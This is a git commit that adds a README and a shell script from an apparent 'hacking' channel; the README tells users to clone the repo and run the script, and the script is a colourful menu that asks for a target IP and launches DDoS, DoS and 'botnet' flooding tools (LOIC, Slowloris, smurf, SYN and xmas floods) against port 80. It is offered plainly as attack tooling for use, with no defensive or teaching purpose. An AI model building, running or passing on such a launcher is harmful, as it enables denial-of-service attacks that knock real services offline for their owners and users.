fe26644ed55e7dc8a7e2a80b8642d88c8bf6f3bc
SDMH-Hacking-TV <77563341+SDMH-Hacking-TV@users.noreply.github.com>
2021-01-20 18:08:11 +0600

    Add files via upload

---
+++ README.md
@@ -0,0 +1,15 @@
+# DDOS444 attack 2
+
+$ pkg update && pkg upgrade 
+$ pkg install git python2 
+$ pkg install git 
+$ git clone https://github.com/SDMH-Hacking-TV/Ddos555.git
+$ cd Ddos555
+$ ls 
+$ sh ddos.sh
+```
+#Help for
+
+*Joint To [ Facebook](https://web.facebook.com/groups/termux.help.bd)!*
+
+*Subscribe to [ Channel on YouTube](https://www.youtube.com/channel/UCWMSK5cTU1dNBt8LKcZdsCw)!*
---
+++ ddos.sh
@@ -0,0 +1,181 @@
+#Denial Of Service and ddos attack 
+# Author :- •⊱•Mrlinkerrorsystem
+# WhatsApp :- 081249281196
+#RECODE ©®
+clear
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+clear
+toilet -f standard "•⊱•Mrlinkerrorsystem" -F gay
+echo
+echo $green"=========================================="
+echo $red"DoS AND DDoS ATTACK LAUCH VIA TOOL •⊱•SDMH-Hacking-TV"
+echo $green"=========================================="
+echo $red"===    ===    ===    ===   ===    ===   ==="
+echo $white"===    ===    ===    ===   ===    ===   ==="
+	echo $red"          ) )           ^                  "
+	echo $red"                       / \                 "
+	echo $red"                      /   \                "
+	echo $red"                     /     \               "
+	echo $red"      |=============/ .---. \=============|"
+	echo $red"       _|___|______/ /     \ \_____|____|_ "
+	echo $green"    |:::::::::::/  \() ()/  \:::::::::::|"
+	echo $red"      |::::::::::/{:-.) A (.-:}\::::::::::|"
+	echo $red"      |::::::::/   :-.\uuu/.-:  \:::::::::|"
+	echo $yellow"   |===================================|"
+	echo $green"    |_________SDMH-Hacking-TV___________|"
+	echo $red"      | _________ | / || \ | __________ |"
+	echo $red"       |  |  |  |  | ====== |   |  |  |  |"
+	echo $red"       |  |--+--|  | |    | |   |--+--|  |"
+	echo $red"       |  |__|__|  | |   o| |   |__|__|  |"
+	echo $red"       |===========| |____| |============|"
+	echo $yellow"    |-----------|________|------------|"
+	echo $yellow"     (=========/__________\=========)  "
+	echo $yellow"    ','',,,,' /____________\,,,'',','  "
+	echo $green"==========================================="
+	echo $white"                  MENU                     "
+	echo $green"============================================="
+	echo $red"[1].DDOS ATTACK.   #SDMH-Hacking-TV"
+	echo $red"[2].DoS ATTACK.    #https://facebook.com/groups/termux.help.bd"
+	echo $red"[3].BOTNET ATTACK. #https://youtube.com/channel/UCWMSK5cTU1dNBt8LKcZdsCw"
+	echo $red"[4].EXIT TOOL.     #    Thank You"
+	echo $green"============================================="
+	echo $white "╭─"$yellow"SDMH-Hacking-TV"
+	read -p " ╰─> " pil
+
+#DDOS
+
+if [ $pil = 1 ] || [ $pil = 1 ]
+then
+clear
+toilet -f slant "LIST DDOS" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].LOIC"
+echo $yellow"[2].AMNESIA"
+echo $yellow"[3].PING OF DEADHT"
+echo $yellow"[4].POF ARMAGEDON LEVEL"
+echo $yellow"[5].LORIS"
+echo $green"============================================="
+echo $white "╭─"$yellow"SDMH-Hacking-TV"
+read -p " ╰─> " ddos
+fi
+
+if [ $ddos = 1 ] || [ $ddos = 1 ]
+then
+clear
+python2 LO1C.py
+fi
+
+if [ $ddos = 2 ] || [ $ddos = 2 ]
+then
+clear
+perl Amnesia.pl
+fi
+
+if [ $ddos = 3 ] || [ $ddos = 3 ]
+then
+clear
+python2 TheSploit.py
+fi
+
+if [ $ddos = 4 ] || [ $ddos = 4 ]
+then
+clear
+python2 arma.py
+fi
+
+if [ $ddos = 5 ] || [ $ddos = 5 ]
+then
+clear
+python2 lor.py
+fi
+
+
+#DOS
+
+
+
+if [ $pil = 2 ] || [ $pil = 2 ]
+then
+clear
+toilet -f slant "LIST DOS" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].WIN(TERMUX)"
+echo $yellow"[2].SUMFR(PC)"
+echo $yellow"[3].UFOSYN(PC)"
+echo $yellow"[4].XMAS(PC)"
+echo $yellow"[5].ANDROMEDA(TERMUX)"
+echo $green"============================================="
+echo $white "╭─"$yellow"SDMH-Hacking-TV"
+read -p " ╰─> " dos
+fi
+
+
+
+if [ $dos = 1 ] || [ $dos = 1 ]
+then
+clear
+toilet -f slant "WIN"
+echo $red"MASUKAN IP TARGET"
+read -p "===>" win
+python2 win.32.64.NT.py -s$win -p80 -t100
+fi
+
+
+
+if [ $dos = 2 ] || [ $dos = 2 ]
+then
+clear
+python2 smurf.py
+fi
+
+if [ $dos = 3 ] || [ $dos = 3 ]
+then
+clear
+python2 ufosyn.py
+fi
+
+if [ $dos = 4 ] || [ $dos = 4 ]
+then
+clear
+python2 xmas.py
+fi
+
+if [ $dos = 5 ] || [ $dos = 5 ]
+then
+clear
+toilet -f slant "DROID RX" |lolcat
+echo $red"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python2 andromeda.py -s$ipt -p80 -t100
+fi
+
+
+
+#BOTNET
+
+if [ $pil = 3 ] || [ pil = 3 ]
+then
+clear
+toilet -f slant " BOTNET" -F gay
+echo $red"MASUKAN IP TARGET"
+read -p "==>" bot
+python2 Botnet.py -s$bot -p80 -t100
+fi
+
+#exit
+
+if [ $pil = 4 ] || [ pil = 4 ]
+then
+clear
+exit
+fi
